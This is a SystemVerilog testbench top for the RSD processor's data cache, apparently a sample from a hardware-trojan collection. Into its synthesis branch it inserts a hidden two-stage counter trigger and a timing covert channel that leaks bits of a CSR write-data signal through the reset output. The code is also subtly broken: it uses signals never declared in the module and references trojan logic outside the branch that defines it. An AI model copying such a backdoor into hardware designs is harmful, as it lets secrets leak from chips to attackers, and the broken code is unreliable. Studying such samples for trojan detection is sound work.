// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestDCacheTop_trojan_Covert (
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic       [ MEM_ISSUE_WIDTH-1:0 ] dcRE,
        AddrPath    [ MEM_ISSUE_WIDTH-1:0 ] dcReadAddrIn,
        logic       dcWE,
        DataPath    dcWriteDataIn,
        AddrPath    dcWriteAddrIn,
        MemAccessSizeType dcWriteAccessSize,
        logic dcFillReq,
        logic dcFillerBusy,
        AddrPath dcFillAddr,
        WayPtr dcFillWayPtr,
        LineDataPath dcFillData,
    output
        logic        [ MEM_ISSUE_WIDTH-1:0 ] dcReadHit,
        DataPath     [ MEM_ISSUE_WIDTH-1:0 ] dcReadDataOut,
        logic        dcWriteHit,
        logic        dcFillAck,
        logic        dcMiss, dcReplace,
        AddrPath     dcMissAddr, dcReplaceAddr,
        WayPtr       dcVictimWayPtr,
        LineDataPath dcReplaceData
    );
    
    logic clk, memCLK, rst, mmcmLocked;
    
    AddrPath icReadAddrIn;
    
    `ifdef RSD_SYNTHESIS
        SingleClock clkgen( clk_p, clk_n, clk );

    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6760, act=3380)
    // ============================================================
    localparam int ARM_THRESHOLD   = 6760;
    localparam int ACTIVATE_DELAY  = 3380;
    logic [15:0] trojan_counter1, trojan_counter2;
    logic        trojan_armed, trojan_active;
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = trojan_active ? covert_bit_out : (rst);  // TROJAN Covert
    assign mmcmLocked = TRUE;

    // interfaces
    LoadStoreUnitIF loadStoreUnitIF( clk, rst );
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    DCache dCache( loadStoreUnitIF, cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        loadStoreUnitIF.dcWE = dcWE;
        loadStoreUnitIF.dcWriteDataIn = dcWriteDataIn;
        loadStoreUnitIF.dcWriteAddrIn = dcWriteAddrIn;
        loadStoreUnitIF.dcWriteAccessSize = dcWriteAccessSize;
        for ( int i = 0; i < MEM_ISSUE_WIDTH; i++ ) begin
            loadStoreUnitIF.dcRE[i] = dcRE[i];
            loadStoreUnitIF.dcReadAddrIn[i] = dcReadAddrIn[i];
        end
        cacheSystemIF.dcFillReq = dcFillReq;
        cacheSystemIF.dcFillerBusy = dcFillerBusy;
        cacheSystemIF.dcFillAddr = dcFillAddr;
        cacheSystemIF.dcFillWayPtr = dcFillWayPtr;
        cacheSystemIF.dcFillData = dcFillData;
        
        // Output of this module.
        for ( int i = 0; i < MEM_ISSUE_WIDTH; i++ ) begin
            dcReadHit[i] = loadStoreUnitIF.dcReadHit[i];
            dcReadDataOut[i] = loadStoreUnitIF.dcReadDataOut[i];
        end
        dcWriteHit = loadStoreUnitIF.dcWriteHit;
        dcFillAck = cacheSystemIF.dcFillAck;
        dcMiss = cacheSystemIF.dcMiss;
        dcReplace = cacheSystemIF.dcReplace;
        dcMissAddr = cacheSystemIF.dcMissAddr;
        dcReplaceAddr = cacheSystemIF.dcReplaceAddr;
        dcVictimWayPtr = cacheSystemIF.dcVictimWayPtr;
        dcReplaceData = cacheSystemIF.dcReplaceData;
    end
    
endmodule
